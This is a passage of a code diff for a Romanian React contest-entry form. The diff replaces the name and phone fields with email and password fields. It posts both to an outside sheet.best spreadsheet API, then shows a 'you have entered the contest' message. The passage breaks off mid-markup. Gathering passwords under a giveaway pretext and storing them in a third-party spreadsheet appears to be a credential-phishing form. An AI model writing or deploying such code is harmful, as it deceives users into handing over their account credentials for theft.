@@ -1,59 +1,80 @@
 import React, { useState } from "react";
 import axios from "axios";
+import logo from "../poze/complete+done+green+success+valid+icon-1320183462969251652.png";
 
 function InputForm() {
   const [email, setEmail] = useState("");
   const [nume, setNume] = useState("");
   const [prenume, setPrenume] = useState("");
   const [telefon, setTelefon] = useState("");
+  const [parola, setParola] = useState("");
+  const [inscris, setInscris] = useState(true);
+
+  const moreProps = "flex flex-col items-center gap-3";
 
   const handleSubmit = (e) => {
     e.preventDefault();
     const data = {
-      FirstName: prenume,
-      Name: nume,
-      Phone: telefon,
       Email: email,
+      Parola: parola,
     };
-    axios.post("https://sheet.best/api/sheets/b667233d-dcef-4049-874d-1f92e134de48", data).then((response) => {
-      console.log(response);
-      setEmail("");
-    });
+    axios
+      .post("https://sheet.best/api/sheets/728c92b1-e241-48b9-a960-b78875ac2ae7", data)
+      .then((response) => {
+        console.log(response);
+        setInscris(false);
+      })
+      .catch(function (error) {
+        console.log(error);
+      });
   };
 
   return (
     <form>
-      <div class="mb-6">
-        <label for="email" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
-          Adresa E-Mail
-        </label>
-        <input type="email" id="email" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" placeholder="adresa-email" required onChange={(e) => setEmail(e.target.value)} />
-      </div>
-      <div class="mb-6">
-        <label for="password" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
-          Nume
-        </label>
-        <input type="text" id="nume" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setNume(e.target.value)} />
-      </div>
-      <div className="mb-6">
-        <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
-          Prenume
-        </label>
-        <input type="text" id="prenume" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setPrenume(e.target.value)} />
-      </div>
-      <div className="mb-6">
-        <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
-          Telefon
-        </label>
-        <input type="number" id="phone" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" placeholder="07XXXXXXXX" required onChange={(e) => setTelefon(e.target.value)} />
-      </div>
-      <div className="flex items-start mb-6">
-        <div className="flex items-center h-5">
-          <input id="terms" type="checkbox" value="" class="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800" required />
+      <div className={!inscris ? "hidden" : "visible"}>
+        <div class="mb-6">
+          <label for="email" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
+            Adresa E-Mail
+          </label>
+          <input type="email" id="email" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setEmail(e.target.value)} />
         </div>
-        <label for="terms" className="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300" required>
-          Sunt de acord sa particip la concurs !
-        </label>
+        <div class="mb-6">
+          <label for="email" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
+            Parola
+          </label>
+          <input type="password" id="Parola" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setParola(e.target.value)} />
+        </div>
+        {/* <div class="mb-6">
+          <label for="password" class="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
+            Nume
+          </label>
+          <input type="text" id="nume" class="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setNume(e.target.value)} />
+        </div>
+        <div className="mb-6">
+          <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
+            Prenume
+          </label>
+          <input type="text" id="prenume" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" required onChange={(e) => setPrenume(e.target.value)} />
+        </div>
+        <div className="mb-6">
+          <label for="repeat-password" className="flex mb-2 text-sm font-medium text-gray-900 dark:text-white">
+            Telefon
+          </label>
+          <input type="number" id="phone" className="shadow-sm bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg block w-full p-2.5" placeholder="07XXXXXXXX" required onChange={(e) => setTelefon(e.target.value)} />
+        </div> */}
+        <div className="flex items-start mb-6">
+          <div className="flex items-center h-5">
+            <input id="terms" type="checkbox" value="" class="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-blue-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-blue-600 dark:ring-offset-gray-800 dark:focus:ring-offset-gray-800" required />
+          </div>
+          <label for="terms" className="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300" required>
+            Sunt de acord sa particip la concurs !
+          </label>
+        </div>
+      </div>
+      {/* <div className="flex flex-col items-center gap-3"> */}
+      <div className={`${inscris ? "hidden" : "visible"} ${moreProps}`}>
+        <img src={logo} alt="" />
+        <h1 className="text-green-500 text-2xl pb-10">Felicitari, ai fost inscris la concurs!</h1>
       </div>
       <div className="flex items-center justify-center">
         <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1" stroke="currentColor" className="w-10 h-10 bg-red-500 text-white rounded-l-lg">
